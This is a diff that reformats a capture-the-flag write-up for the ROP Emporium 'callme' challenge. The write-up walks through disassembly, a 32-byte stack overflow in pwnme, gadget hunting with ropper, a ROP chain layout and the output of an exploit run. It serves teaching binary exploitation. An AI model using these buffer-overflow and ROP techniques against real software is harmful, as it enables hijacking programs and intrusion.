@@ -10,43 +10,34 @@ More information in the linked website.
 ## How to build the ROP chain
 
 Download the challenge:
-```
-curl --output callme.zip https://ropemporium.com/binary/callme.zip
-unzip callme.zip && rm callme.zip
+```sh
+$ curl --output callme.zip https://ropemporium.com/binary/callme.zip
+$ unzip callme.zip && rm callme.zip
 ```
 
 First, let's see the function written by the programmer:
-```
-rabin2 -qs callme | grep -ve imp -e ' 0 '
+```sh
+$ rabin2 -qs callme | grep -ve imp -e ' 0 '
 ```
 
->0x00601070 8 stdout
->
->0x00601078 1 completed.7698
->
->0x00400898 90 pwnme
->
->0x004008f2 74 usefulFunction
->
->0x004009b0 2 __libc_csu_fini
->
->0x00601070 8 stdout@@GLIBC_2.2.5
->
->0x004009c0 4 _IO_stdin_used
->
->0x00400940 101 __libc_csu_init
->
->0x00400790 2 _dl_relocate_static_pie
->
->0x00400760 43 _start
->
->0x00400847 81 main
-
+```asm
+0x00601070 8 stdout
+0x00601078 1 completed.7698
+0x00400898 90 pwnme
+0x004008f2 74 usefulFunction
+0x004009b0 2 __libc_csu_fini
+0x00601070 8 stdout@@GLIBC_2.2.5
+0x004009c0 4 _IO_stdin_used
+0x00400940 101 __libc_csu_init
+0x00400790 2 _dl_relocate_static_pie
+0x00400760 43 _start
+0x00400847 81 main
+```
 
 Enter to pwndbg (```gdb-pwndbg callme```) and disassemble ```pwnme``` and ```usefulFunction``` since we're interested in them:
 
-```
-pwndbg disass pwnme
+```asm
+pwndbg> disass pwnme
 Dump of assembler code for function pwnme:
    0x0000000000400898 <+0:     push   rbp
    0x0000000000400899 <+1:     mov    rbp,rsp
@@ -76,8 +67,8 @@ End of assembler dump.
 
 As we can see there's a ```rax,[rbp-0x20]``` instruction before the read operation. Here ```0x20``` is subtracted from ```rbp``` since they're the bytes allocated to store the input string (32 bytes): if more chars are inserted it's possible to overwrite the return address of this function, so this is the point where the flow of execution will be changed by us.
 
-```
-pwndbg disass usefulFunction
+```asm
+pwndbg> disass usefulFunction
 Dump of assembler code for function usefulFunction:
    0x00000000004008f2 <+0:     push   rbp
    0x00000000004008f3 <+1:     mov    rbp,rsp
@@ -104,8 +95,8 @@ This function is useful because:
 
 Since it's necessary to store values into edx, esi, edi, we need to find gadgets in the executables e.g. instructions which pop values in those registers and ends with a ret. ```ropper``` is a useful tool to find the available ones:
 
-```
-ropper -f callme
+```sh
+$ ropper -f callme
 ```
 
 We can note that there's a gadget which it's the one we was looking for:
@@ -116,7 +107,7 @@ We can note that there's a gadget which it's the one we was looking for:
 Now we have all the elements to build a rop chain.
 Here's how the stack should be structured before the ret instruction in the ```pwnme``` function:
 
-```
+```asm
 |                    |
 |                    |
 |      p_gadget      |
@@ -134,6 +125,7 @@ Here's how the stack should be structured before the ret instruction in the ```p
 | 0xcafebabecafebabe |
 | 0xd00df00dd00df00d |
 |    callme_three    |
+|        ...         |
 ----------------------
           |
           V
@@ -154,6 +146,7 @@ Here's how the stack should be structured before the ret instruction in the ```p
 | 0xcafebabecafebabe |
 | 0xd00df00dd00df00d |
 | 0x00000000004006f0 |
+|        ...         |
 ----------------------
         STACK
 ```
@@ -203,26 +196,17 @@ p.sendline(payload)
 
 p.interactive()
 ```
-```
-python3 exploit.py
-```
+```sh
+$ python3 exploit.py
 
->[+] Starting local process './callme': pid 15670
->
->[*] running in new terminal: ['/usr/bin/gdb', '-q', './callme', '15670', '-x', '/tmp/pwnsm5xq4d2.gdb']
->
->[+] Waiting for debugger: Done
->
->[*] Switching to interactive mode
->
-> Thank you!
->
->[*] Process './callme' stopped with exit code 0 (pid 15670)
->
->callme_one() called correctly
->
->callme_two() called correctly
->
->ROPE{a_placeholder_32byte_flag!}
->
->[*] Got EOF while reading in interactive
+[+] Starting local process './callme': pid 15670
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './callme', '15670', '-x', '/tmp/pwnsm5xq4d2.gdb']
+[+] Waiting for debugger: Done
+[*] Switching to interactive mode
+ Thank you!
+[*] Process './callme' stopped with exit code 0 (pid 15670)
+callme_one() called correctly
+callme_two() called correctly
+ROPE{a_placeholder_32byte_flag!}
+[*] Got EOF while reading in interactive
+```
